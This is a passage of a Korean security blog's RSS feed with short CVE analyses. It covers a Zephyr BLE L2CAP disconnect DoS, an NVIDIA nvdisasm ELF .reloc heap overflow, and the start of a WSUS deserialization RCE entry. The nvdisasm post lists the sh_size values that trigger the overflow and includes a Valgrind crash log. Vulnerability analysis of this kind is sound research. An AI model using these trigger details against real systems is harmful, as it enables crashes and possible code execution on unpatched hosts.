&#xBC1C;&#xACAC;&#xB41C; &#xACF3;&#xC740; L2CAP Flow Control Credit Indication &#xC694;&#xCCAD;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; l2cap.c&#xC758; <code>le_credits()</code> &#xD568;&#xC218; &#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">le_credits</span><span class="hljs-params">(struct bt_l2cap *l2cap, <span class="hljs-keyword">uint8_t</span> ident,</span></span><span class="hljs-function"><span class="hljs-params">       struct net_buf *buf)</span></span><span class="hljs-function"></span>{<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_conn</span> *<span class="hljs-title">conn</span> = <span class="hljs-title">l2cap</span>-&gt;<span class="hljs-title">chan</span>.<span class="hljs-title">chan</span>.<span class="hljs-title">conn</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_l2cap_chan</span> *<span class="hljs-title">chan</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_l2cap_le_credits</span> *<span class="hljs-title">ev</span> = (<span class="hljs-title">void</span> *)<span class="hljs-title">buf</span>-&gt;<span class="hljs-title">data</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_l2cap_le_chan</span> *<span class="hljs-title">le_chan</span>;</span><span class="hljs-keyword">uint16_t</span> credits, cid;...cid = sys_le16_to_cpu(ev-&gt;cid);credits = sys_le16_to_cpu(ev-&gt;credits);le_chan = BT_L2CAP_LE_CHAN(chan);<span class="hljs-keyword">if</span> (atomic_get(&amp;le_chan-&gt;tx.credits) + credits &gt; UINT16_MAX) { <span class="hljs-comment">//[1] trigger point</span>LOG_ERR(<span class="hljs-string">&quot;Credits overflow&quot;</span>);bt_l2cap_chan_disconnect(chan); <span class="hljs-comment">//disconnect when integer overflow</span><span class="hljs-keyword">return</span>;}</code></pre><p>&#xCF54;&#xB4DC;&#xC758; <code>[1]</code>&#xC5D0;&#xC11C; <code>credits</code>&#xB294; 16&#xBE44;&#xD2B8; &#xD544;&#xB4DC;&#xC774;&#xBA70; <code>tx.credits</code>&#xB294; <code>atomic_t</code> &#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>tx.credits</code>+<code>credits</code>&#xC758; &#xAC12;&#xC774; 65,535 &#xC774;&#xC0C1;&#xC77C; &#xACBD;&#xC6B0; integer overflow&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>UINT16_MAX</code>&#xB97C; &#xD55C;&#xACC4;&#xAC12;&#xC73C;&#xB85C; &#xAC80;&#xC0AC;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xD574;&#xB2F9; &#xCC44;&#xB110;&#xC758; &#xC5F0;&#xACB0;&#xC744; &#xC885;&#xB8CC;&#xC2DC;&#xD0A4;&#xAE30; &#xC704;&#xD574; <code>bt_l2cap_chan_disconnect()</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bt_l2cap_chan_disconnect</span><span class="hljs-params">(struct bt_l2cap_chan *chan)</span></span><span class="hljs-function"></span>{<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_conn</span> *<span class="hljs-title">conn</span> = <span class="hljs-title">chan</span>-&gt;<span class="hljs-title">conn</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_buf</span> *<span class="hljs-title">buf</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_l2cap_disconn_req</span> *<span class="hljs-title">req</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_l2cap_le_chan</span> *<span class="hljs-title">le_chan</span>;</span><span class="hljs-keyword">if</span> (!conn) {<span class="hljs-keyword">return</span> -ENOTCONN;}<span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_BT_CLASSIC) &amp;&amp; <span class="hljs-comment">//[*]</span>    conn-&gt;type == BT_CONN_TYPE_BR) {<span class="hljs-keyword">return</span> bt_l2cap_br_chan_disconnect(chan);}le_chan = BT_L2CAP_LE_CHAN(chan);LOG_DBG(<span class="hljs-string">&quot;chan %p scid 0x%04x dcid 0x%04x&quot;</span>, chan, le_chan-&gt;rx.cid, le_chan-&gt;tx.cid);le_chan-&gt;ident = get_ident(); <span class="hljs-comment">// alloc new ID to channel</span>buf = l2cap_create_le_sig_pdu(BT_L2CAP_DISCONN_REQ,      le_chan-&gt;ident, <span class="hljs-keyword">sizeof</span>(*req));<span class="hljs-keyword">if</span> (!buf) {<span class="hljs-keyword">return</span> -ENOMEM;}req = net_buf_add(buf, <span class="hljs-keyword">sizeof</span>(*req)); <span class="hljs-comment">// [2] request packet struct</span>req-&gt;dcid = sys_cpu_to_le16(le_chan-&gt;tx.cid);req-&gt;scid = sys_cpu_to_le16(le_chan-&gt;rx.cid);l2cap_chan_send_req(chan, buf, L2CAP_DISC_TIMEOUT); <span class="hljs-comment">// [3] send disconnect msg</span>bt_l2cap_chan_set_state(chan, BT_L2CAP_DISCONNECTING);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xC774;&#xD6C4; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xC758; &#xCF54;&#xB4DC; <code>[2]</code>&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xCC44;&#xB110;&#xC758; <code>tx.cid</code>, <code>rx.cid</code>&#xB97C; <code>req</code> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; &#xB2F4;&#xC544; &#xC5F0;&#xACB0; &#xD574;&#xC81C;&#xB97C; &#xC704;&#xD55C; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xCF54;&#xB4DC;&#xC758; <code>[3]</code> &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC744; &#xD1B5;&#xD574; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;.</p><p>| &#xCF54;&#xB4DC;&#xC758; <code>[*]</code> &#xBD80;&#xBD84;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Bluetooth&#xC5D0;&#xB294; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE58;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">le_disconn_rsp</span><span class="hljs-params">(struct bt_l2cap *l2cap, <span class="hljs-keyword">uint8_t</span> ident,</span></span><span class="hljs-function"><span class="hljs-params">   struct net_buf *buf)</span></span><span class="hljs-function"></span>{<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_conn</span> *<span class="hljs-title">conn</span> = <span class="hljs-title">l2cap</span>-&gt;<span class="hljs-title">chan</span>.<span class="hljs-title">chan</span>.<span class="hljs-title">conn</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_l2cap_le_chan</span> *<span class="hljs-title">chan</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bt_l2cap_disconn_rsp</span> *<span class="hljs-title">rsp</span> = (<span class="hljs-title">void</span> *)<span class="hljs-title">buf</span>-&gt;<span class="hljs-title">data</span>;</span><span class="hljs-keyword">uint16_t</span> scid;<span class="hljs-keyword">if</span> (buf-&gt;len &lt; <span class="hljs-keyword">sizeof</span>(*rsp)) {LOG_ERR(<span class="hljs-string">&quot;Too small LE disconn rsp packet size&quot;</span>);<span class="hljs-keyword">return</span>;}scid = sys_le16_to_cpu(rsp-&gt;scid);LOG_DBG(<span class="hljs-string">&quot;dcid 0x%04x scid 0x%04x&quot;</span>, sys_le16_to_cpu(rsp-&gt;dcid), scid);chan = l2cap_remove_rx_cid(conn, scid);<span class="hljs-keyword">if</span> (!chan) {<span class="hljs-keyword">return</span>;}bt_l2cap_chan_del(&amp;chan-&gt;chan);}</code></pre><p>&#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xD6C4; request&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294; <code>le_disonn_rsp()</code>&#xC5D0;&#xC11C; <code>cid</code> &#xAC12;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xACE0;&#xC815;&#xB41C; CID &#xAC12;&#xC744; &#xAC00;&#xC9C0;&#xB294; &#xC911;&#xC694;&#xD55C; &#xC11C;&#xBE44;&#xC2A4;&#xB4E4;(LE SIGNAL CHANNEL, SMP, ATT &#x2026;)&#xC5D0; &#xB300;&#xD574; &#xC5F0;&#xACB0;&#xD574;&#xC81C;&#xAC00; &#xAC00;&#xB2A5;&#xD574;&#xC838; DoS &#xACF5;&#xACA9;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://elixir.bootlin.com/zephyr/v4.1.0/source/subsys/bluetooth/host/l2cap.c">Zephyr: l2cap.c</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/DoS/">DoS</category>
      
      <category domain="https://hackyboiz.github.io/tags/poosic/">poosic</category>
      
      <category domain="https://hackyboiz.github.io/tags/Zephyr/">Zephyr</category>
      
      <category domain="https://hackyboiz.github.io/tags/BLE/">BLE</category>
      
      <category domain="https://hackyboiz.github.io/tags/L2CAP/">L2CAP</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-10456/">CVE-2025-10456</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/19/poosic/cve-2025-10456/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-23271: NVIDIA nvdisasm의 heap overflow 취약점</title>
      <link>https://hackyboiz.github.io/2025/11/05/ogu123/cve-2025-23271/</link>
      <guid>https://hackyboiz.github.io/2025/11/05/ogu123/cve-2025-23271/</guid>
      <pubDate>Wed, 05 Nov 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://talosintelligence.com/vulnerability_reports</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2025-2191">https://talosintelligence.com/vulnerability_reports/TALOS-2025-2191</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>NVIDIA nvdisasm 12.8.90</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>NVIDIA nvdisasm&#xB294; CUDA toolkit&#xC5D0; &#xD3EC;&#xD568;&#xB41C; &#xB3C4;&#xAD6C;&#xB85C; CUDA ELF &#xD30C;&#xC77C;&#xC758; disassembly, control low graphs, register life-ranges, debug &#xC815;&#xBCF4;&#xB97C; &#xD45C;&#xC2DC;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> uint16 Elf32_Half;<span class="hljs-keyword">typedef</span> uint32 Elf32_Word;<span class="hljs-keyword">typedef</span> uint32 Elf32_Addr;<span class="hljs-keyword">typedef</span> uint32 Elf32_Off;<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>    Elf32_Word sh_name;    Elf32_Word sh_type;    Elf32_Word sh_flags;    Elf32_Addr sh_addr;    Elf32_Off  sh_offset;    Elf32_Word sh_size;    Elf32_Word sh_link;    Elf32_Word sh_info;    Elf32_Word sh_addralign;    Elf32_Word sh_entsize;} Elf32_Shdr;</code></pre><p>ELF &#xD30C;&#xC77C;&#xC758; .reloc &#xC139;&#xC158;&#xC740; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xAC00; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB85C;&#xB4DC;&#xB420; &#xB54C; &#xD544;&#xC694;&#xD55C; &#xC7AC;&#xBC30;&#xCE58;(relocation) &#xC815;&#xBCF4;&#xB97C; &#xB098;&#xD0C0;&#xB0C5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; nvdisasm&#xC774; 32bit ELF &#xD30C;&#xC77C;&#xC758; .reloc &#xC139;&#xC158;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xBA74;&#xC11C; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-number">0045</span>c699  mov     rsi, qword [rsp {var_b8_1}]<span class="hljs-number">0045</span>c69d  mov     rdi, qword [rax+<span class="hljs-number">0x18</span>]<span class="hljs-number">0045</span>c6a1  shr     rsi, <span class="hljs-number">0x3</span>                     (<span class="hljs-number">1</span>) <span class="hljs-number">0045</span>c6a5  shl     rsi, <span class="hljs-number">0x4</span>                     (<span class="hljs-number">2</span>)<span class="hljs-number">0045</span><span class="hljs-function">c6a9  call    <span class="hljs-title">sub_40a610</span>                   <span class="hljs-params">(<span class="hljs-number">3</span>)</span></span></code></pre><p>nvdisasm&#xC740; ELF &#xD30C;&#xC77C;&#xC758; .reloc &#xC139;&#xC158;&#xC744; 0x45ada0 &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD30C;&#xC2F1; &#xD569;&#xB2C8;&#xB2E4;.</p><p>offset 0x45c699&#xC5D0;&#xC11C; &#xD604;&#xC7AC; .reloc &#xC139;&#xC158;&#xC758; <code>sh_size</code>&#xB97C; rsi &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB85C; &#xC62E;&#xAE30;&#xACE0; (1),(2)&#xB97C; &#xD1B5;&#xD574; <code>sh_size</code> &#xAC12;&#xC744; 2&#xBC30;&#xB85C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C;, <code>sh_size</code> &#xAC12;&#xC740; &#xBA54;&#xBAA8;&#xB9AC; &#xD560;&#xB2F9; &#xD06C;&#xAE30;&#xB85C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-number">0045</span>c07b  lea     r14, [rbx+rsi]               ...<span class="hljs-number">0045</span>c6ef  lea     rax, [r14+<span class="hljs-number">0x7</span>]               <span class="hljs-number">0045</span>c6f3  lea     rsi, [rbx+<span class="hljs-number">0x8</span>]               <span class="hljs-number">0045</span>c6f7  sub     rax, rsi                     ...<span class="hljs-number">0045</span>c6fa  mov     r8, rax     <span class="hljs-number">0045</span>c6fd  shr     r8, <span class="hljs-number">0x3</span>     <span class="hljs-number">0045</span>c701  add     r8, <span class="hljs-number">0x1</span>     ...<span class="hljs-number">0045</span>c70f  mov     rdi, r8     ...<span class="hljs-number">0045</span>c718  shr     rdi, <span class="hljs-number">0x2</span></code></pre><pre><code class="hljs cpp">loop_counter = (((sh_size<span class="hljs-number">-1</span>) &gt;&gt; <span class="hljs-number">3</span>) + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">2</span></code></pre><p>&#xC704; &#xC5B4;&#xC148;&#xBE14;&#xB9AC;&#xB97C; &#xD574;&#xC11D;&#xD558;&#xBA74; <code>sh_size</code>(rsi)&#xC744; &#xD1B5;&#xD574; &#xBC18;&#xBCF5;&#xBB38; &#xCE74;&#xC6B4;&#xD2B8; &#xAC12;&#xC744; &#xACC4;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-number">0045</span>c720  movdqu  xmm0, xmmword [rdx+<span class="hljs-number">0x10</span>]<span class="hljs-number">0045</span>c725  pxor    xmm6, xmm6<span class="hljs-number">0045</span>c729  add     rsi, <span class="hljs-number">0x1</span>                    <span class="hljs-number">0045</span>c72d  add     rdx, <span class="hljs-number">0x20</span>                   <span class="hljs-number">0045</span>c731  add     rax, <span class="hljs-number">0x40</span>                   (<span class="hljs-number">4</span>)...<span class="hljs-number">0045</span>c79d  movups  xmmword [rax<span class="hljs-number">-0x30</span>], xmm5    (<span class="hljs-number">5.</span>a)<span class="hljs-number">0045</span>c7a1  movups  xmmword [rax<span class="hljs-number">-0x40</span>], xmm1    (<span class="hljs-number">5.b</span>)...<span class="hljs-number">0045</span>c7b1  movups  xmmword [rax<span class="hljs-number">-0x10</span>], xmm4    (<span class="hljs-number">5.</span>c)<span class="hljs-number">0045</span>c7b5  movups  xmmword [rax<span class="hljs-number">-0x20</span>], xmm1    (<span class="hljs-number">5.</span>d)<span class="hljs-number">0045</span>c7b9  cmp     rdi, rsi<span class="hljs-number">0045</span>c7bc  ja      <span class="hljs-number">0x45c720</span></code></pre><p>&#xC774;&#xD6C4; &#xBC18;&#xBCF5;&#xBB38;&#xC744; &#xD1B5;&#xD574; AVX &#xC154;&#xD50C; &#xC5F0;&#xC0B0;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; &#xB370; (4),(5.a)~(5.d)&#xB97C; &#xD1B5;&#xD574; &#xBCF5;&#xC0AC;&#xB418;&#xB294; heap &#xC601;&#xC5ED;&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; rax&#xAC00; 0x40&#xC529; &#xC99D;&#xAC00;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs cpp">buffer_size = (sh_size &gt;&gt; <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">4</span>loop_counter = (((sh_size<span class="hljs-number">-1</span>) &gt;&gt; <span class="hljs-number">3</span>) + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">2</span>assumed_size = loop_counter * <span class="hljs-number">0x40</span></code></pre><p>&#xC55E;&#xC11C; <code>sh_size</code> &#xAC12;&#xC744; &#xD1B5;&#xD574; heap size&#xC640; &#xBC18;&#xBCF5;&#xBB38; &#xD69F;&#xC218;&#xB97C; &#xAD6C;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xB2E4;&#xC2DC; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74;, &#xD2B9;&#xC815; <code>sh_size</code> &#xAC12;&#xC744; &#xD1B5;&#xD574; assumed_size&#xAC00; buffer_size &#xBCF4;&#xB2E4; &#xD06C;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC838; heap overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">sh_size: <span class="hljs-number">0x19</span>, buffer size: <span class="hljs-number">0x30</span>, assumed size: <span class="hljs-number">0x40</span>sh_size: <span class="hljs-number">0x1a</span>, buffer size: <span class="hljs-number">0x30</span>, assumed size: <span class="hljs-number">0x40</span>sh_size: <span class="hljs-number">0x1b</span>, buffer size: <span class="hljs-number">0x30</span>, assumed size: <span class="hljs-number">0x40</span>sh_size: <span class="hljs-number">0x1c</span>, buffer size: <span class="hljs-number">0x30</span>, assumed size: <span class="hljs-number">0x40</span>sh_size: <span class="hljs-number">0x1d</span>, buffer size: <span class="hljs-number">0x30</span>, assumed size: <span class="hljs-number">0x40</span>sh_size: <span class="hljs-number">0x1e</span>, buffer size: <span class="hljs-number">0x30</span>, assumed size: <span class="hljs-number">0x40</span>sh_size: <span class="hljs-number">0x1f</span>, buffer size: <span class="hljs-number">0x30</span>, assumed size: <span class="hljs-number">0x40</span>sh_size: <span class="hljs-number">0x39</span>, buffer size: <span class="hljs-number">0x70</span>, assumed size: <span class="hljs-number">0x80</span>...</code></pre><p>&#xB530;&#xB77C;&#xC11C; &#xACF5;&#xACA9;&#xC790;&#xB294; ELF &#xD30C;&#xC77C;&#xC758; .reloc &#xC139;&#xC158; <code>sh_size</code> &#xAC12;&#xC744; &#xC704;&#xC640; &#xAC19;&#xC774; &#xC0AC;&#xC6A9;&#xD574; heap overflow&#xB85C; &#xC778;&#xD574; RCE&#xB97C; &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">==<span class="hljs-number">152542</span>== Memcheck, a memory error detector==152542== Copyright (C) 2002-2024, and GNU GPL&apos;d, by Julian Seward et al. ==<span class="hljs-number">152542</span>== Using Valgrind<span class="hljs-number">-3.23</span><span class="hljs-number">.0</span> <span class="hljs-keyword">and</span> LibVEX; rerun with -h <span class="hljs-keyword">for</span> copyright info==<span class="hljs-number">152542</span>== Command: ./nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span> ./ac0bcb07==<span class="hljs-number">152542</span>== Parent PID: <span class="hljs-number">132852</span>==<span class="hljs-number">152542</span>== ==<span class="hljs-number">152542</span>== Invalid write of size <span class="hljs-number">8</span>==<span class="hljs-number">152542</span>==    at <span class="hljs-number">0x45C7B1</span>: ??? (in /home/dtatsis/nvdisasm/trizzle-<span class="hljs-keyword">new</span>/<span class="hljs-number">0x444961</span>-write8-a572c03c/nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x45CEA5</span>: ??? (in /home/dtatsis/nvdisasm/trizzle-<span class="hljs-keyword">new</span>/<span class="hljs-number">0x444961</span>-write8-a572c03c/nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x40307A</span>: ??? (in /home/dtatsis/nvdisasm/trizzle-<span class="hljs-keyword">new</span>/<span class="hljs-number">0x444961</span>-write8-a572c03c/nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x48A21C9</span>: (below main) (libc_start_call_main.h:<span class="hljs-number">58</span>)==<span class="hljs-number">152542</span>==  Address <span class="hljs-number">0x4a99368</span> is <span class="hljs-number">0</span> bytes after a block of size <span class="hljs-number">184</span> alloc<span class="hljs-number">&apos;</span>d==<span class="hljs-number">152542</span>==    at <span class="hljs-number">0x484680F</span>: <span class="hljs-built_in">malloc</span> (vg_replace_malloc.c:<span class="hljs-number">446</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x465719</span>: ??? (in /home/dtatsis/nvdisasm/trizzle-<span class="hljs-keyword">new</span>/<span class="hljs-number">0x444961</span>-write8-a572c03c/nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x40A999</span>: ??? (in /home/dtatsis/nvdisasm/trizzle-<span class="hljs-keyword">new</span>/<span class="hljs-number">0x444961</span>-write8-a572c03c/nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x45C6AD</span>: ??? (in /home/dtatsis/nvdisasm/trizzle-<span class="hljs-keyword">new</span>/<span class="hljs-number">0x444961</span>-write8-a572c03c/nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x45CEA5</span>: ??? (in /home/dtatsis/nvdisasm/trizzle-<span class="hljs-keyword">new</span>/<span class="hljs-number">0x444961</span>-write8-a572c03c/nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x40307A</span>: ??? (in /home/dtatsis/nvdisasm/trizzle-<span class="hljs-keyword">new</span>/<span class="hljs-number">0x444961</span>-write8-a572c03c/nvdisasm<span class="hljs-number">-12.8</span><span class="hljs-number">.90</span>)==<span class="hljs-number">152542</span>==    by <span class="hljs-number">0x48A21C9</span>: (below main) (libc_start_call_main.h:<span class="hljs-number">58</span>)==<span class="hljs-number">152542</span>== ==<span class="hljs-number">152542</span>== ==<span class="hljs-number">152542</span>== HEAP SUMMARY:==<span class="hljs-number">152542</span>==     in use at <span class="hljs-built_in">exit</span>: <span class="hljs-number">24</span>,<span class="hljs-number">556</span> bytes in <span class="hljs-number">154</span> blocks==<span class="hljs-number">152542</span>==   total heap usage: <span class="hljs-number">228</span> allocs, <span class="hljs-number">74</span> frees, <span class="hljs-number">39</span>,<span class="hljs-number">566</span> bytes allocated==<span class="hljs-number">152542</span>== ==<span class="hljs-number">152542</span>== LEAK SUMMARY:==<span class="hljs-number">152542</span>==    definitely lost: <span class="hljs-number">248</span> bytes in <span class="hljs-number">8</span> blocks==<span class="hljs-number">152542</span>==    indirectly lost: <span class="hljs-number">8</span>,<span class="hljs-number">062</span> bytes in <span class="hljs-number">123</span> blocks==<span class="hljs-number">152542</span>==      possibly lost: <span class="hljs-number">16</span>,<span class="hljs-number">246</span> bytes in <span class="hljs-number">23</span> blocks==<span class="hljs-number">152542</span>==    still reachable: <span class="hljs-number">0</span> bytes in <span class="hljs-number">0</span> blocks==<span class="hljs-number">152542</span>==         suppressed: <span class="hljs-number">0</span> bytes in <span class="hljs-number">0</span> blocks==<span class="hljs-number">152542</span>== Rerun with --leak-check=full to see details of leaked memory==<span class="hljs-number">152542</span>== ==<span class="hljs-number">152542</span>== For lists of detected <span class="hljs-keyword">and</span> suppressed errors, rerun with: -s==<span class="hljs-number">152542</span>== ERROR SUMMARY: <span class="hljs-number">2</span> errors from <span class="hljs-number">1</span> contexts (suppressed: <span class="hljs-number">0</span> from <span class="hljs-number">0</span>)</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/heap-overflow/">heap overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/NVIDIA/">NVIDIA</category>
      
      <category domain="https://hackyboiz.github.io/tags/nvdisasm/">nvdisasm</category>
      
      <category domain="https://hackyboiz.github.io/tags/ELF/">ELF</category>
      
      <category domain="https://hackyboiz.github.io/tags/reloc/">.reloc</category>
      
      
      <comments>https://hackyboiz.github.io/2025/11/05/ogu123/cve-2025-23271/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-59287: WSUS(Windows Server Update Services)의 인증되지 않은 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/11/02/bekim/2025-11-20/</link>
      <guid>https://hackyboiz.github.io/2025/11/02/bekim/2025-11-20/</guid>
      <pubDate>Sun, 02 Nov 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerabili</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-59287">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-59287</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>WSUS&#xAC00; &#xC124;&#xCE58; &#xBC0F; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xC11C;&#xBC84;&#xC5D0;&#xB9CC; &#xC601;&#xD5A5;</p><ul><li>Windows Server 2012</li><li>Windows Server 2012 R2</li><li>Windows Server 2016</li><li>Windows Server 2019</li><li>Windows Server 2022</li><li>Windows Server 2025</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows Server Update Services(WSUS)&#xB294; &#xAE30;&#xC5C5; &#xD658;&#xACBD;&#xC5D0;&#xC11C; Windows &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xC758; &#xC2B9;&#xC778;, &#xBC30;&#xD3EC;, &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;&#xC744; &#xC911;&#xC559;&#xC5D0;&#xC11C; &#xB2F4;&#xB2F9;&#xD558;&#xB294; &#xC778;&#xD504;&#xB77C; &#xC11C;&#xBE44;&#xC2A4;&#xC785;&#xB2C8;&#xB2E4;. CVE-2025-59287&#xC740; WSUS&#xC758; &#xC6F9; &#xBCF4;&#xACE0;&amp;&#xAD00;&#xB9AC; &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xAC00; &#xC678;&#xBD80;&#xC5D0;&#xC11C; &#xC804;&#xC1A1;&#xB41C; &#xC9C1;&#xB82C;&#xD654;(serialized) &#xB370;&#xC774;&#xD130;&#xB97C; &#xC801;&#xC808;&#xD788; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xACE0; .NET &#xB7F0;&#xD0C0;&#xC784;&#xC5D0;&#xC11C; 